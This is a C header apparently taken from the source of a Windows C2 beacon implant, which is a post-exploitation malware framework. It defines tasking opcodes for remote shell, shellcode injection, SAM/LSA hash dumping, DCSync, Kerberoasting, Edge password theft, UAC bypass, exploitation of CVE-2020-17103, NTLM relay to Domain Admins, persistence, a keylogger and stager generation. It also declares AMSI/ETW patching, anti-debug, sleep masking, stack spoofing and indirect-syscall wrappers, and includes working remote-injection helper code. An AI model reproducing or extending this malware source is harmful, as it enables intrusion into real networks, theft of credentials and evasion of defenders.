#pragma once

#include <windows.h>
#include <winternl.h>
#include <stdint.h>

#ifndef NtCurrentProcess
#define NtCurrentProcess() ((HANDLE)(LONG_PTR)-1)
#endif

// ---- Beacon wire opcodes (mirror of common/co2h/proto.hpp TaskOp / RespOp).
#define OP_NOOP     0
#define OP_SLEEP    1
#define OP_EXIT     2
#define OP_KILL     3  // TerminateProcess немедленно
#define OP_SHELL    10
#define OP_RUN      11
#define OP_PS       12
#define OP_UPLOAD   20
#define OP_DOWNLOAD 21
#define OP_LS       22
#define OP_CD       23
#define OP_PWD      24
#define OP_RM       25
#define OP_CP       26
#define OP_MV       27
#define OP_INJECT   40
#define OP_SPAWN    41
#define OP_BOF      50
#define OP_EXEASM   51
#define OP_ISHELL   60
#define OP_TCP_PIVOT     90
#define OP_TOKEN_STEAL   80
#define OP_TOKEN_MAKE    81
#define OP_TOKEN_REV     82
#define OP_TOKEN_GETUID  83
#define OP_PRIV_ALL      84  // enable all token privileges
#define OP_INJECT_THREAD 100   // shellcode inject via NtCreateThreadEx
#define OP_INJECT_APC    101   // shellcode inject via NtQueueApcThread
#define OP_SPAWNTO       103   // spawn sacrificial process and inject
#define OP_MODSTOMP      104   // module-stomping payload execution
#define OP_MIGRATE       105   // inject sc into pid then ExitProcess
#define OP_INJECT_DLL    106   // fork & run: reflective DLL → sacrificial process → capture stdout
#define OP_HASHDUMP      110   // dump SAM/LSA hashes
#define OP_TICKET_LIST   111   // list Kerberos tickets
#define OP_TICKET_DUMP   112   // extract Kerberos ticket
#define OP_TICKET_USE    113   // pass-the-ticket (KerbSubmitTicketMessage)
#define OP_TICKET_PURGE  114   // purge Kerberos tickets
#define OP_PRIVESC_ADMIN  120  // UAC bypass: fodhelper ms-settings hijack
#define OP_PRIVESC_SYSTEM 121  // SYSTEM: winlogon token theft
#define OP_PRIVESC_PLASMA 122  // SYSTEM: CVE-2020-17103 CfAbortOperation race (Cloud Files)
#define OP_LDAP_ADDDA     130  // NTLM relay → LDAP → add user to Domain Admins
#define OP_LDAP_RBCD      131  // NTLM relay → LDAP → write msDS-AllowedToActOnBehalfOfOtherIdentity
#define OP_DCSYNC         132  // MS-DRSR IDL_DRSGetNCChanges EXOP_REPL_SECRETS → NT hash
#define OP_KERBEROAST     133  // LDAP enum SPNs + LSA TGS request → $krb5tgs$ hashes
#define OP_SCREENSHOT     134  // снимок экрана → BMP через RESP_FILE
#define OP_PERSIST_REG    135  // {name utf8, path utf8} — HKCU\...\Run
#define OP_PERSIST_TASK   136  // {name utf8, path utf8} — Scheduled Task (ITaskService)
#define OP_PERSIST_WMI    137  // {name utf8, script utf8, [interval uint32]} — WMI event subscription
#define OP_PSEXEC_CMD     140  // SCM service → remote cmd → stdout via ADMIN$
#define OP_WMIEXEC        141  // WMI Win32_Process::Create → remote cmd → stdout via ADMIN$
#define OP_DCOMEXEC       142  // DCOM MMC20.Application → remote cmd → stdout via ADMIN$
#define OP_WINRMEXEC      143  // WinRM WS-Management shell → remote cmd → stdout via ADMIN$
#define OP_PORTFWD        144  // local TCP port forward: {action, lport, rhost, rport}
#define OP_PORTSCAN       148  // {target utf8, ports utf8 (opt)} — TCP connect scan
#define OP_KEYLOGGER      149  // {cmd utf8: start|dump|stop} — WH_KEYBOARD_LL hook
#define OP_RPORTFWD_OPEN  145  // {conn_id u64, rhost utf8, rport u32} — подключиться к rhost:rport
#define OP_RPORTFWD_DATA  146  // {conn_id u64, data bytes} — отправить данные в соединение
#define OP_RPORTFWD_CLOSE 147  // {conn_id u64} — закрыть соединение
#define OP_SOCKS_OPEN     160  // {conn_id u64, host utf8, port u32} — connect to SOCKS target
#define OP_SOCKS_DATA     161  // {conn_id u64, data bytes} — relay data to target
#define OP_SOCKS_CLOSE    162  // {conn_id u64} — close SOCKS connection
#define OP_RELAY_START    170  // {port u32} — open relay TCP listener for child beacons
#define OP_RELAY_STOP     171  // {port u32} — close relay listener
#define OP_RELAY_RESP     172  // {child_uid u32, data bytes} — raw frame for child socket
#define OP_STAGER_LNK     180  // {url utf8 \0 out_path utf8} — create .lnk stager
#define OP_STAGER_HTA     181  // {url utf8 \0 out_path utf8} — create .hta stager
#define OP_STAGER_VBS     182  // {url utf8 \0 out_path utf8} — create .vbs stager
#define OP_STAGER_WSF     183  // {url utf8 \0 out_path utf8} — create .wsf stager
#define OP_STAGER_ISO     184  // {url utf8 \0 out_path utf8} — create .iso via IMAPI2
#define OP_STAGER_CHM     185  // {url utf8 \0 out_path utf8} — create .chm via hhc.exe
#define OP_EDGE_CREDS     191  // {} — dump cleartext passwords from msedge.exe heap
#define OP_ADCS_ENUM      190  // {domain utf8 (opt)} — ESC1-16 certificate misconfiguration scan

// Special task_id values for out-of-band SOCKS / relay output frames.
// These values are chosen to not collide with any real task_id
// (server uses 64-bit counters starting at 1).
#define SOCKS_TASK_MAGIC  ((uint64_t)0xFFFFFFFFFFFFFFFEULL)
#define RELAY_TASK_MAGIC    ((uint64_t)0xFFFFFFFFFFFFFFFDULL)
#define RPORTFWD_TASK_MAGIC ((uint64_t)0xFFFFFFFFFFFFFFFCULL)

// Raw transport envelope msg types (TCP/SMB).
#define TPORT_CHECKIN    1
#define TPORT_POLL       2
#define TPORT_TASKS      3
#define TPORT_OUTPUT     4
#define TPORT_ACK        5

#define RESP_CHECKIN 0
#define RESP_ACK     1
#define RESP_OUTPUT  2
#define RESP_FILE    3
#define RESP_ERROR   4
#define OUT_CHUNK_BYTES (512u * 1024u)   // chunk size for file transfers
#define RESP_PS      5
#define RESP_LS      6

// Maximum size for the listener's RSA-2048 BCRYPT_RSAPUBLIC_BLOB.
// Layout: 24-byte header + cbPublicExp + cbModulus. For 2048-bit keys with
// e=0x010001 the actual size is ~283 bytes; rounded up to 540 to leave room
// for RSA-4096 if listeners are ever upgraded.
#define BEACON_RSA_PUB_MAX 540

// ---- Fallback C2 channels (автоматическая ротация при потере связи) --------
#define FALLBACK_MAX_SLOTS  4
#define FALLBACK_MAX_FAILS  3   // переключение после N подряд неудач

// ---- Global beacon state held in a single private allocation.
// Packed to byte alignment so artifact-gen can patch fields by linear offset
// without guessing about compiler padding (see tools/artifact-gen/PatchBeacon.cpp).
#pragma pack(push, 1)
typedef struct FallbackSlot {
    wchar_t  host[128];             // C2 host (256 bytes, UTF-16LE)
    uint16_t port;                  // C2 port
    wchar_t  uri_checkin[128];      // URI / transport selector (256 bytes)
    uint8_t  active;                // 1 = слот используется, 0 = пустой
    uint8_t  _pad[3];              // выравнивание до 518 байт
} FallbackSlot;
#pragma pack(pop)

#pragma pack(push, 1)
typedef struct BeaconState {
    // Static configuration baked in at build time.
    uint8_t  listener_key[32];   // AES-256 key shared with listener (auths checkin)
    wchar_t  host[128];          // C2 host
    uint16_t port;               // C2 port
    wchar_t  uri_checkin[128];
    wchar_t  uri_task[128];
    wchar_t  uri_post[128];
    wchar_t  user_agent[256];
    wchar_t  metadata_cookie[64];
    uint8_t  spawn_to[128];      // utf-8 spawnto (x64 process)
    uint8_t  rsa_pub_blob[BEACON_RSA_PUB_MAX]; // listener's RSA pubkey (BCrypt blob)
    uint32_t rsa_pub_len;        // valid bytes in rsa_pub_blob (0 = no RSA — legacy)
    char     parent_id[33];      // parent beacon hex-id, empty = root beacon

    // Runtime state.
    char     beacon_id[33];      // hex id assigned by server
    uint8_t  session_key[32];    // per-session AES key (random; sent RSA-wrapped at checkin)
    uint32_t sleep_ms;
    uint8_t  jitter_pct;
    uint8_t  authenticated;
    uint8_t  checkin_done;
    uint8_t  quit;
    uint32_t watermark;       // reserved (4 bytes, little-endian)

    // Fallback C2 channels (после watermark — не ломает совместимость)
    FallbackSlot fallback[FALLBACK_MAX_SLOTS]; // 4 × 518 = 2072 bytes
    uint8_t  fallback_count;        // сколько слотов активно (0..4)
    uint8_t  _fb_pad[3];           // выравнивание
} BeaconState;
#pragma pack(pop)

BeaconState* beacon_state(void);

// ---- Task queue ----------------------------------------------------------
typedef struct BeaconTask {
    uint64_t id;
    uint16_t op;
    uint32_t pay_len;
    uint8_t* pay;
} BeaconTask;

typedef struct BeaconOutput {
    uint64_t task_id;
    uint16_t resp;
    uint32_t len;
    uint8_t* data;
} BeaconOutput;

// ---- Allocator ----------------------------------------------------------
void* bmalloc(size_t n);
void* bcalloc(size_t n);
void  bfree(void* p);
void* brealloc(void* p, size_t n);

// ---- Runtime helpers (no CRT) ------------------------------------------
void  rt_memset(void* dst, int c, size_t n);
void  rt_memcpy(void* dst, const void* src, size_t n);
int   rt_memcmp(const void* a, const void* b, size_t n);
size_t rt_strlen(const char* s);
size_t rt_wstrlen(const wchar_t* s);

// ---- Crypto (BCrypt AES-GCM) -------------------------------------------
// Writes ciphertext + tag to out; returns number of bytes written, or 0.
size_t aes_gcm_seal(const uint8_t* key32, const uint8_t* nonce12,
                    const uint8_t* pt, size_t pt_len,
                    uint8_t* out /* ct||tag */);

// Returns plaintext length on success, or 0 on auth failure.
size_t aes_gcm_open(const uint8_t* key32, const uint8_t* nonce12,
                    const uint8_t* ct_tag, size_t ct_tag_len,
                    uint8_t* out_pt);

void   bc_random(uint8_t* out, size_t n);

// RSA-OAEP-SHA256 encrypt with the listener's public key (BCRYPT_RSAPUBLIC_BLOB).
// Returns ciphertext length (256 for RSA-2048) or 0 on any failure.
size_t rsa_oaep_encrypt(const uint8_t* pub_blob, uint32_t pub_blob_len,
                        const uint8_t* pt, uint32_t pt_len,
                        uint8_t* out, uint32_t out_cap);

// ---- Frame sealing (matches server BeaconCrypto format) ---------------
// [1 ver][12 nonce][ct+tag]
size_t seal_frame(const uint8_t* key32, const uint8_t* pt, size_t pt_len,
                  uint8_t* out);
size_t open_frame(const uint8_t* key32, const uint8_t* blob, size_t blob_len,
                  uint8_t* out);

// ---- Transport abstraction --------------------------------------------
typedef struct TransportVtbl {
    int (*checkin)(const uint8_t* metadata, size_t metadata_len,
                   uint8_t* out_frame, size_t* out_frame_len);
    int (*poll_tasks)(uint8_t* out_frame, size_t* out_frame_len);
    int (*submit_output)(const uint8_t* frame, size_t frame_len);
    // Возвращает 1 если соединение сброшено и нужен re-checkin (SMB/TCP).
    // Для HTTPS всегда 0 (stateless).
    int (*connection_lost)(void);
} TransportVtbl;

extern const TransportVtbl g_transport_https;
extern const TransportVtbl g_transport_tcp;
extern const TransportVtbl g_transport_smb;
extern const TransportVtbl g_transport_dns;

// Selects active transport based on uri_checkin prefix:
//   "tcp://"          — raw TCP
//   "smb://" or "\\." — SMB named pipe
//   anything else     — HTTPS (default)
const TransportVtbl* select_transport(void);

// ---- Output queue helpers ----------------------------------------------
void out_begin(uint64_t task_id, uint16_t resp);
void out_write(const void* data, size_t len);
void out_mark_done(void);       // prevent out_flush_via_transport from sending empty frame
size_t out_remaining(void);
void out_flush_chunk(const TransportVtbl* t, uint32_t is_last);
void out_flush_via_transport(const TransportVtbl* t);
const TransportVtbl* get_transport(void);

// ---- Interactive shell pump (called from main loop each iteration) ---------
void ishell_pump(void);

// Send a sealed frame directly, bypassing the shared output buffer.
// Safe to call from main loop only (not thread-safe for TCP/SMB transports).
void transport_direct_send(const TransportVtbl* t, uint64_t task_id,
                            const uint8_t* data, size_t len);

// Same as transport_direct_send but with explicit response type (RESP_OUTPUT / RESP_FILE / ...).
void transport_direct_send_typed(const TransportVtbl* t, uint64_t task_id,
                                  uint32_t resp_type,
                                  const uint8_t* data, size_t len);

// Poll and flush pending SOCKS / relay / rportfwd out-of-band output.
// Called from the main beacon loop after normal task output is flushed.
void socks_flush_pending(const TransportVtbl* t);
void relay_flush_pending(const TransportVtbl* t);
void rportfwd_flush_pending(const TransportVtbl* t);

// Приостановить / возобновить фоновые relay-потоки вокруг masked_sleep,
// чтобы они не выполняли код из .text пока тот зашифрован.
void relay_suspend_threads(void);
void relay_resume_threads(void);


// ---- KV encoder / decoder (wire-compatible with co2h::kv) --------------
void  kv_reset(uint8_t* buf, size_t cap);
void  kv_put_str(const char* key, const char* val);
void  kv_put_bytes(const char* key, const uint8_t* val, uint32_t len);
void  kv_put_u32(const char* key, uint32_t v);
void  kv_put_u64(const char* key, uint64_t v);
size_t kv_finish(uint8_t* out_count_prefix); // returns total bytes written

int   kv_find(const uint8_t* buf, size_t len, const char* key,
              const uint8_t** out_val, uint32_t* out_len);
int   kv_get_str(const uint8_t* buf, size_t len, const char* key,
                 char* out, size_t out_cap);
int   kv_get_u32(const uint8_t* buf, size_t len, const char* key, uint32_t* out);
int   kv_get_u64(const uint8_t* buf, size_t len, const char* key, uint64_t* out);

// ---- Metadata gatherer --------------------------------------------------
// Fills a KV blob with host/user/pid/arch/ip for initial checkin.
// If wrapped_key/wrapped_key_len != NULL/0, additionally emits the
// "wrapped_key" entry — RSA-OAEP-encrypted per-session AES key.
size_t build_metadata(uint8_t* out, size_t cap,
                      const uint8_t* wrapped_key, uint32_t wrapped_key_len);

// ---- OPSEC: ETW / AMSI patching ----------------------------------------
void opsec_patch_etw(void);
void opsec_patch_amsi(void);

// ---- OPSEC: anti-debug -------------------------------------------------
int  opsec_is_debugged(void);

// ---- OPSEC: sleep with mask --------------------------------------------
void masked_sleep(uint32_t ms);

// ---- OPSEC: Process Inject Kit -----------------------------------------
// Unified injection entry point. Uses user PIC blob from .injkit if patched,
// otherwise falls back to built-in alloc+write+protect+thread.
// method: 0=THREAD, 1=APC, 2=SPAWN.
uint32_t kit_inject(
    HANDLE target_process, DWORD target_pid, uint32_t method,
    const uint8_t* shellcode, uint32_t shellcode_len,
    const uint16_t* spawn_to, uint32_t spawn_to_len,
    HANDLE* out_thread, HANDLE* out_process, void** out_remote_base);

// ---- OPSEC: call-stack spoofing ----------------------------------------
void     spoofed_sleep(uint32_t ms);
uint32_t spoofed_wait(HANDLE h, uint32_t ms);

// ---- Debug logging ---------------------------------------------------------
static inline void bdbg(const char* msg) {
    OutputDebugStringA(msg);
    // File logging — writes beacon.log next to the module.
    // wchar_t path[MAX_PATH];
    // DWORD n = GetModuleFileNameW(NULL, path, MAX_PATH);
    // if (n == 0 || n >= MAX_PATH) {
    //     path[0] = L'.'; path[1] = L'\\'; path[2] = 0; n = 2;
    // } else {
    //     while (n > 0 && path[n-1] != L'\\' && path[n-1] != L'/') --n;
    //     path[n] = 0;
    // }
    // const wchar_t leaf[] = L"beacon.log";
    // if (n + (sizeof(leaf)/sizeof(wchar_t)) < MAX_PATH) {
    //     for (size_t i = 0; leaf[i]; ++i) path[n + i] = leaf[i];
    //     path[n + (sizeof(leaf)/sizeof(wchar_t)) - 1] = 0;
    // }
    // HANDLE h = CreateFileW(path,
    //     FILE_APPEND_DATA, FILE_SHARE_READ|FILE_SHARE_WRITE, NULL,
    //     OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    // if (h != INVALID_HANDLE_VALUE) {
    //     SYSTEMTIME st; GetLocalTime(&st);
    //     char ts[16];
    //     ts[0]='['; ts[1]=(char)('0'+(st.wHour/10)%10); ts[2]=(char)('0'+st.wHour%10); ts[3]=':';
    //     ts[4]=(char)('0'+(st.wMinute/10)%10); ts[5]=(char)('0'+st.wMinute%10); ts[6]=':';
    //     ts[7]=(char)('0'+(st.wSecond/10)%10); ts[8]=(char)('0'+st.wSecond%10); ts[9]='.';
    //     ts[10]=(char)('0'+(st.wMilliseconds/100)%10);
    //     ts[11]=(char)('0'+(st.wMilliseconds/10)%10);
    //     ts[12]=(char)('0'+st.wMilliseconds%10);
    //     ts[13]=']'; ts[14]=' '; ts[15]=0;
    //     DWORD w;
    //     WriteFile(h, ts, 15, &w, NULL);
    //     size_t L = 0; while (msg[L]) ++L;
    //     WriteFile(h, msg, (DWORD)L, &w, NULL);
    //     CloseHandle(h);
    // }
}

// ---- Plasma CVE-2020-17103 child process dispatch ----------------------
void plasma_stage_entry(int stage);

// ---- Commands ----------------------------------------------------------
void cmd_dispatch(const BeaconTask* t);

// ---- BOF loader --------------------------------------------------------
int  bof_execute(const uint8_t* coff, size_t coff_len,
                 const char* entry,
                 const uint8_t* args, size_t args_len);

// ---- API hashing (resolve loaded module exports by hash) --------------
void* api_resolve(uint32_t dll_hash, uint32_t fn_hash);
void* peb_find_module(uint32_t dll_hash);
uint32_t api_hash(const char* s);
uint32_t api_hash_w(const wchar_t* s);

// ---- HellsHall indirect syscalls ---------------------------------------
// hh_init() must be called once at beacon startup before any Nt*_i wrapper.
// On x86 this is a no-op — indirect syscalls via the WOW64 layer are not
// used; the Nt*_i macros below fall back to VirtualAllocEx/ProtectEx/FreeEx.
void hh_init(void);

#ifdef _WIN64
// x64: ASM stubs in syscall_stubs.asm — no prologue, return address on the kernel
// stack points inside ntdll (indirect syscall via gadget), not into the beacon.
extern NTSTATUS NtAllocateVirtualMemory_i(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
extern NTSTATUS NtProtectVirtualMemory_i(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
extern NTSTATUS NtFreeVirtualMemory_i(HANDLE, PVOID*, PSIZE_T, ULONG);
extern NTSTATUS NtOpenProcess_i(PHANDLE, ACCESS_MASK, PVOID, PVOID);
extern NTSTATUS NtWriteVirtualMemory_i(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
extern NTSTATUS NtReadVirtualMemory_i(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
extern NTSTATUS NtCreateThreadEx_i(PHANDLE, ACCESS_MASK, PVOID, HANDLE,
                                   PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
#else
// x86/WOW64: direct WinAPI calls — indirect syscall through WOW64 is not needed.
static __inline NTSTATUS NtAllocateVirtualMemory_i(
        HANDLE proc, PVOID* base, ULONG_PTR zbits,
        PSIZE_T regsz, ULONG type, ULONG prot) {
    (void)zbits;
    *base = VirtualAllocEx(proc, *base, *regsz, type, prot);
    return *base ? 0L : (NTSTATUS)0xC0000017L; /* STATUS_NO_MEMORY */
}
static __inline NTSTATUS NtProtectVirtualMemory_i(
        HANDLE proc, PVOID* base, PSIZE_T size, ULONG newprot, PULONG oldprot) {
    return VirtualProtectEx(proc, *base, *size, newprot, oldprot)
           ? 0L : (NTSTATUS)0xC0000022L; /* STATUS_ACCESS_DENIED */
}
static __inline NTSTATUS NtFreeVirtualMemory_i(
        HANDLE proc, PVOID* base, PSIZE_T size, ULONG type) {
    return VirtualFreeEx(proc, *base, *size, type)
           ? 0L : (NTSTATUS)0xC0000022L;
}
static __inline NTSTATUS NtOpenProcess_i(
        PHANDLE h, ACCESS_MASK access, PVOID oa, PVOID cid) {
    (void)oa;
    struct { HANDLE proc; HANDLE thread; } *id = (void*)cid;
    *h = OpenProcess(access, FALSE, (DWORD)(ULONG_PTR)id->proc);
    return *h ? 0L : (NTSTATUS)0xC0000022L;
}
static __inline NTSTATUS NtWriteVirtualMemory_i(
        HANDLE proc, PVOID base, PVOID buf, SIZE_T sz, PSIZE_T written) {
    SIZE_T wr = 0;
    BOOL ok = WriteProcessMemory(proc, base, buf, sz, &wr);
    if (written) *written = wr;
    return ok ? 0L : (NTSTATUS)0xC0000022L;
}
static __inline NTSTATUS NtReadVirtualMemory_i(
        HANDLE proc, PVOID base, PVOID buf, SIZE_T sz, PSIZE_T rd) {
    SIZE_T r = 0;
    BOOL ok = ReadProcessMemory(proc, base, buf, sz, &r);
    if (rd) *rd = r;
    return ok ? 0L : (NTSTATUS)0xC0000022L;
}
static __inline NTSTATUS NtCreateThreadEx_i(
        PHANDLE hThread, ACCESS_MASK access, PVOID oa, HANDLE proc,
        PVOID start, PVOID arg, ULONG flags,
        SIZE_T zerobits, SIZE_T stack, SIZE_T maxstack, PVOID attrlist) {
    (void)access; (void)oa; (void)zerobits; (void)maxstack; (void)attrlist;
    *hThread = CreateRemoteThread(proc, NULL, stack,
                                  (LPTHREAD_START_ROUTINE)start, arg, flags, NULL);
    return *hThread ? 0L : (NTSTATUS)0xC0000022L;
}
#endif

// ---- Minimal NT structs (no winternl.h dependency) -------------------------
typedef struct { HANDLE UniqueProcess; HANDLE UniqueThread; } NT_CLIENT_ID;
typedef struct {
    ULONG  Length;
    HANDLE RootDirectory;
    PVOID  ObjectName;
    ULONG  Attributes;
    PVOID  SecurityDescriptor;
    PVOID  SecurityQualityOfService;
} NT_OBJECT_ATTRS;

// ---- Convenience wrappers (used across beacon commands) --------------------

// Open a process by PID.
static __inline HANDLE nt_open_process(DWORD access, DWORD pid) {
    HANDLE h = NULL;
    NT_OBJECT_ATTRS oa = {sizeof(NT_OBJECT_ATTRS),0,NULL,0,NULL,NULL};
    NT_CLIENT_ID    cid = {(HANDLE)(ULONG_PTR)pid, NULL};
    NtOpenProcess_i(&h, access, &oa, &cid);
    return h;
}
// Allocate memory in any process (use GetCurrentProcess() for self).
static __inline PVOID nt_alloc_remote(HANDLE hp, SIZE_T sz, ULONG prot) {
    PVOID p = NULL; SIZE_T s = sz;
    NtAllocateVirtualMemory_i(hp, &p, 0, &s, MEM_COMMIT|MEM_RESERVE, prot);
    return p;
}
// Free memory in any process.
static __inline void nt_free_remote(HANDLE hp, PVOID p) {
    SIZE_T s = 0;
    NtFreeVirtualMemory_i(hp, &p, &s, MEM_RELEASE);
}
// Write memory in remote process; returns TRUE on success.
static __inline BOOL nt_write(HANDLE hp, PVOID dst, const void* src, SIZE_T sz) {
    SIZE_T wr = 0;
    return NtWriteVirtualMemory_i(hp, dst, (PVOID)src, sz, &wr) >= 0 && wr == sz;
}
// Read memory from remote process; returns TRUE on success.
static __inline BOOL nt_read(HANDLE hp, PVOID src, void* dst, SIZE_T sz) {
    SIZE_T rd = 0;
    return NtReadVirtualMemory_i(hp, src, dst, sz, &rd) >= 0;
}
// Create a thread in any process; returns thread HANDLE or NULL.
static __inline HANDLE nt_create_thread(HANDLE hp, PVOID start, PVOID arg) {
    HANDLE h = NULL;
    NtCreateThreadEx_i(&h, THREAD_ALL_ACCESS, NULL, hp,
                       start, arg, 0, 0, 0, 0, NULL);
    return h;
}
// Allocate in the current process.
static __inline PVOID nt_alloc_local(SIZE_T sz, ULONG prot) {
    return nt_alloc_remote((HANDLE)(LONG_PTR)-1, sz, prot);
}
// Free in the current process.
static __inline void nt_free_local(PVOID p) {
    nt_free_remote((HANDLE)(LONG_PTR)-1, p);
}
// Change protection in the current process.
static __inline BOOL nt_protect_local(PVOID p, SIZE_T sz, ULONG prot, PULONG old) {
    PVOID b = p; SIZE_T s = sz;
    return NtProtectVirtualMemory_i((HANDLE)(LONG_PTR)-1, &b, &s, prot, old) >= 0;
}
